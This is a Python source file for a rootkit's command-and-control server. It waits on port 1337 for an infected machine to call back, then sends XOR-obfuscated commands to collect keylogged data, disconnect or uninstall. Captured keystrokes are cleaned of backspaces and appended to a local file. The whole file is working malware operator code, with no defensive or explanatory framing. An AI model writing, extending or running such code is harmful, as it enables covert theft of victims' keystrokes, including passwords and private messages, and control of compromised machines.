#!/usr/bin/env python3
import socket
import enum
import time
from datetime import datetime
from pytz import timezone

COMMANDS_DICT = {'Collect': '1',
                 'Disconnect': '2',
                 'Uninstall': '3'
                 }

class C2Server:

    def __init__(self):
        self.socket             = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.c2_port            = 1337
        self.key                = b'\xde\xad\xbe\xef'
        self.conn               = None
        self.keylog_filepath    = 'keylog_data'
        self.commands = {
                         '1': self.collect,
                         '2': self.disconnect,
                         '3': self.uninstall
                         }

    @staticmethod
    def menu():
        user_choice = input(
            """
######                                        #     #                      
#     #  ####   ####  ##### #    # # #####    ##   ## ###### #    # #    #
#     # #    # #    #   #   #   #  #   #      # # # # #      ##   # #    #
######  #    # #    #   #   ####   #   #      #  #  # #####  # #  # #    #
#   #   #    # #    #   #   #  #   #   #      #     # #      #  # # #    #
#    #  #    # #    #   #   #   #  #   #      #     # #      #   ## #    # 
#     #  ####   ####    #   #    # #   #      #     # ###### #    #  #### 
            
                        1: Collect Data
                        2: Disconnect C2
                        3: Uninstall Rootkit
:"""
            )
        return user_choice

    def serve(self):
        self.socket.bind(('', self.c2_port))
        self.socket.listen()
        print("Waiting for rootkit callback")
        self.conn, addr = self.socket.accept()
        print("Received callback from rootkit at address: {0}".format(str(addr)))
        with self.conn:
            user_choice = '0'
            done = 0
            while not done:
                while user_choice not in COMMANDS_DICT.values():
                    user_choice = self.menu()
                    print(user_choice)
                self.commands[user_choice]()
                if user_choice in (COMMANDS_DICT['Uninstall'], COMMANDS_DICT['Disconnect']):
                    done = 1
                    print("Shutting down")
                user_choice = 0

    def collect(self):
        collect_byte = b'\x01'
        rc = self.marshal_and_send(collect_byte, collect_byte)
        if not rc:
            print("Error when collecting keylogged data: invalid ACK received...")
            return rc
        keylog_data = self.decode_tlv()
        print("Keylog data: {0}".format(keylog_data))

        user_choice = None
        while user_choice not in ('Y', 'n'):
            user_choice = input('Would you like the keylog data to be written with backspace\'d characters removed? (Y/n): ')

        if user_choice == 'Y':
            keylog_data = self.remove_backspace(keylog_data)
            print("Keylog data with no backspaces: {0}".format(keylog_data))

        with open(self.keylog_filepath, 'a') as fp:
            date_obj = datetime.now(tz=timezone('US/Eastern'))
            fp.write(str(date_obj) + ': ')
            fp.write(keylog_data)
            fp.write('\n')
        print("Keylog data successfully written to {0}".format(self.keylog_filepath))
        return True

    def remove_backspace(self, data):
        index = data.find('BACKSPACE')
        if index == -1:
            return data
        parted = data.partition('BACKSPACE')
        new_str = parted[0][:-1] + parted[2]
        return self.remove_backspace(new_str)

    def uninstall(self):
        print("Sending uninstall command to rootkit...")
        uninstall_byte = b'\x03'
        rc = self.marshal_and_send(uninstall_byte, uninstall_byte)
        if not rc:
            print("Error when uninstall rootkit: invalid ACK received...")
            return rc
        self.disconnect()
    
    def disconnect(self):
        print("Closing connection...")
        disconnect_byte = b'\x02'
        rc = self.marshal_and_send(disconnect_byte, disconnect_byte, check_ack=False)
        self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()

    def marshal_and_send(self, message, ack_byte, check_ack=True):
        encrypted_message = self.crypto(message)
        self.conn.sendall(encrypted_message)
        if not check_ack:
            return True

        enc_ack = self.conn.recv(1)
        ack = self.crypto(enc_ack)
        if ack[0].to_bytes(1, byteorder='big') != ack_byte:
            print("Error with ack byte. Received: {0}, Expected: {1}".format(ack[0].to_bytes(1, byteorder='big'), ack_byte))
            return False
        return True

    def crypto(self, message):
        message = bytearray(message)
        for i in range(0, len(message)):
            message[i] = message[i] ^ self.key[i % len(self.key)]

        return message

    def decode_tlv(self):
        enc_tlv_len = self.conn.recv(4)
        tlv_len = self.crypto(enc_tlv_len)
        length = int.from_bytes(tlv_len, byteorder='big', signed=False)
        encrypted_message = self.conn.recv(length)
        bytes_message = self.crypto(encrypted_message)
        return bytes_message.decode('utf-8')


if __name__ == "__main__":
    c2 = C2Server()
    c2.serve()
